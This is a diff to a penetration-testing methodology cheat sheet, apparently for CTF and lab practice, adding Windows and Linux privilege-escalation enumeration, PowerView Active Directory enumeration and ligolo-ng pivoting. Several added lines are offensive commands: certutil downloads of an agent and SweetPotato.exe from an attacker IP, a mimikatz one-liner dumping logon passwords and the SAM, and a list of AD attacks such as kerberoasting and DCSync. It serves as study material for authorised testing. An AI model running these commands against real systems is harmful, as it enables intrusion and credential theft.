@@ -9,6 +9,8 @@
 
 + Note: Enumeration is a CYCLIC process; all enumeration steps have to be tried whenever something is found, even if it seems similar or equivalent to a previous finding
 
++ Whenever enumerating at any stage (initial recon or privesc), check EVERY SINGLE THING till you find a clue/foothold; do NOT assume anything because assumptions would lead to missing the next vector (also check notes)
+
 + Scanning:
 
   Start with a TCP scan; if you do not get anything from footprinting the services found, then only go for a UDP scan since it is time-consuming.
@@ -70,7 +72,7 @@
   + Bruteforce - if you really need to use ```hydra``` to bruteforce basic authentication or login form, for example, then make sure you know the username(s) and for passwords you can use rockyou.txt; in case usernames are not given, choose a few common usernames or based on the challenge, and in addition to that generate a wordlist from the website using ```cewl```
 
     ```sh
-    gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1 -t 25
+    gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
     # directory scan - this is not recursive to save time
     # if any directories found, recursively scan those directories in another command
 
@@ -245,6 +247,21 @@
 
   # if pivoting into other machines in same network is required
   # we can look into sshuttle and scanning other internal hosts using a ping sweep - check THM Holo room
+
+  dpkg -l
+  # list apps installed by 'dpkg'
+
+  mount
+  # list mounted filesystems
+
+  lsmod
+  # list loaded kernel modules
+
+  /sbin/modinfo modulename
+  # check info on any kernel module
+
+  less /proc/1932/status
+  # inspect process info of PID 1932
   ```
 
 ## Windows Privilege Escalation
@@ -299,8 +316,6 @@
   # try credentials
 
   # registry keys can also contain passwords
-  reg query HKLM /f password /t REG_SZ /s
-
   reg query HKLM /f password /t REG_SZ /s
 
   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -392,7 +407,101 @@
   sc stop unquotedsvc
 
   sc start unquotedsvc
+  
+  # check Autoruns for any programs - the path will differ
+  C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
 
+  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+  # check for AlwaysInstallElevated
+
+  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+  # check for exploits related to regsvc
+
+  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+  # check for file permissions on executable files
+
+  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  # check for Startup apps
+
+  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+  # service permissions
+
+  dir C:\
+  # enumerate directories at top-level, check for subdirectories
+  ```
+
+  ```ps
+  # enumerate in PS
+
+  Get-LocalUser
+  # list all users
+
+  Get-LocalGroup
+  # list all groups
+
+  Get-LocalGroupMember Administrators
+  # list members of a group
+
+  systeminfo
+  # check OS name, version, system type
+
+  ipconfig /all
+  # list all network interfaces
+
+  route print
+  # display routing table
+
+  netstat -ano
+  # list all active network connections
+
+  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  # list all 32-bit installed apps
+
+  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  # list all 64-bit installed apps
+
+  # the registry key queries may not be complete always
+  # so we should always manually check directories like 'Program Files' and 'Downloads'
+
+  Get-Process
+  # list running processes
+
+  # search for files with respect to apps enumerated earlier
+
+  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+  # search for kdbx files
+
+  Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+  # search for configuration files of XAMPP
+
+  Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+  # search for documents and text files in user home directory
+
+  # if we get creds for any user, check if it is a local user
+  # also check for password re-use
+
+  # if Transcription and Script Block Logging settings are enabled
+  # in PowerShell, we can extract log info
+
+  Get-History
+  # commands executed previously
+
+  (Get-PSReadlineOption).HistorySavePath
+  # path of history file from PSReadline
+
+  type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  # this history file can contain previous commands
+
+  # this file mentions 'Start-Transcript' with a filepath
+  # PS Transcription logs the session till 'Stop-Transcript', so we can check this file
+
+  type C:\Users\Public\Transcripts\transcript01.txt
+
+  # to search for Script Block Logging events, search for event ID 4104
+  ```
+
+  ```cmd
   # Active Directory enum
 
   net user /domain
@@ -417,24 +526,58 @@
   # using cmdlets like Get-ADUser, Get-ADGroup, Get-ADObject and Get-ADDomain
   # or using tools such as Sharphound/Bloodhound
 
-  C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
-  # check Autoruns for any programs - the path will differ
+  # AD enum with PowerView
+  Import-Module .\PowerView.ps1
 
-  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
-  # check for AlwaysInstallElevated
+  Get-NetDomain
+  # basic info of domain
 
-  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
-  # check for exploits related to regsvc
+  Get-NetUser
+  # list of all users in domain, with all attributes
 
-  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
-  # check for file permissions on executable files
+  Get-NetUser | select cn
+  # prints only 'cn' - username attribute - of all users
 
-  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-  # check for Startup apps
+  Get-NetUser | select cn,pwdlastset,lastlogon
+  # get username, timestamp for last password change, and last login
 
-  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
-  # service permissions
+  Get-NetGroup | select cn
+  # prints name of all groups
+
+  Get-NetGroup "Sales Department" | select member
+  # print members of group
+  
+  Get-NetComputer | select operatingsystem,dnshostname
+  # list OS and hostnames
+
+  Find-LocalAdminAccess
+  # scans network to check if current user has admin permissions on any computer in domain
+
+  Get-NetSession -ComputerName files04 -Verbose
+  # check for any logged-in users
+
+  Get-NetUser -SPN | select samaccountname,serviceprincipalname
+  # check SPNs
+
+  Get-ObjectAcl -Identity stephanie
+  # enumerate user to check which ACEs are applied
+
+  Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+  # convert SIDs to readable format
+
+  Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+  # in certain group, check if any users have 'GenericAll' permissions
+  # in general, look out for interesting perms like 'GenericAll', 'GenericWrite', 'AllExtendedRights', etc.
+
+  Find-DomainShare -CheckShareAccess
+  # finds shares on computers in domain, but takes time
+
+  Invoke-ACLScanner -ResolveGUIDs
+
+  Find-InterestingDomainAcl
+  # check for interesting entries
+
+  # do not forget AD attacks - mostly using impacket tools
   ```
 
 ## Miscellaneous
@@ -465,6 +608,7 @@
   For any text that you cannot understand or decode, it could be encoded/encrypted, and sometimes in multiple layers. Check with the following tools:
 
   + [CyberChef](https://gchq.github.io/CyberChef/) - check with all recipes
+
   + [dCode](https://www.dcode.fr/en) - can be used to identify cipher used; also browse for all tools as it contains a lot of esoteric languages
 
 + Bruteforce:
@@ -516,26 +660,72 @@
     hashcat -a 0 -m 1600 apachehash.txt /usr/share/wordlists/rockyou.txt
     ```
   
-+ SSH tunnelling:
++ Pivoting using ```ligolo-ng```:
 
   ```sh
-  ssh joe@target.com -i id_rsa -D 1337
-  # setup dynamic port forwarding
+  # on attacker
+  sudo ip tuntap add user sv mode tun ligolo
+  sudo ip link set ligolo up
 
-  # in attacker machine, setup port forwarding
-  vim /etc/proxychains.conf
-
-  # comment out 'socks4 127.0.0.1 9050' at end of config
-  # and add 'socks5 127.0.0.1 1337'
-
-  # use proxychains to enumerate internal ports on target machine
-  # command to be run on attacker machine
-  proxychains nmap -sT 127.0.0.1
-
-  # perform local port forwarding, to port 80, using -L
-  # after this we will be able to access service, which is running on target server port 80, on our attacker machine port 4444
-  ssh joe@target.com -i id_rsa -L 4444:127.0.0.1:80
+  ~/Tools/ligolo-ng/proxy -selfcert
+  # run the proxy
   ```
+
+  ```cmd
+  # suppose we have reverse shell on a Windows system - which has access to internal network
+  # fetch the agent file for this target
+
+  certutil -urlcache -f http://192.168.45.200:8000/ligolo-ng-windows/agent.exe agent.exe
+
+  .\agent.exe -connect 192.168.45.200:11601 -ignore-cert
+  # connect to attacker
+  ```
+
+  ```sh
+  # on attacker
+  # in ligolo shell, where we get the connection
+  session
+  # select the session
+
+  ifconfig
+  # verify IP info
+
+  # in new tab, add routing info for internal network
+  sudo ip route add 10.10.79.0/24 dev ligolo
+
+  # in ligolo session, start tunneling
+  start
+  ```
+
+  ```sh
+  # in attacker, in ligolo session
+  # we can create a listener
+  # e.g. - for file transfer from attacker to another target on internal network
+  listener_add --addr 0.0.0.0:1236 --to 0.0.0.0:8000
+
+  listener_list
+  # verify
+  ```
+
+  ```cmd
+  # on target in internal facing network
+  # we can use the pivot's IP & port as configured on ligolo listener
+  certutil -urlcache -f http://10.10.150.147:1236/SweetPotato.exe  SweetPotato.exe
+  ```
+
++ AD attacks - if policies allow, we can test multiple types of attacks in AD env:
+
+  + password spraying using ```crackmapexec```, ```kerbrute```
+
+  + AS-REP roasting using ```impacket-GetNPUsers```
+
+  + kerberoasting using ```impacket-GetUserSPNs```
+
+  + forging tickets with ```mimikatz```
+
+  + DC sync attacks using ```mimikatz```, ```impacket-secretsdump```
+
+  + creating shadow copies with ```vshadow```
 
 + mimikatz:
 
@@ -543,4 +733,4 @@
 
   + test with latest version of the tool in case the standard binary does not work
 
-  + in case of a non-interactive shell, we can run the binary in a single command without entering the mimikatz prompt - ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit```
+  + in case of a non-interactive shell, we can run the binary in a single command without entering the mimikatz prompt - ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"```
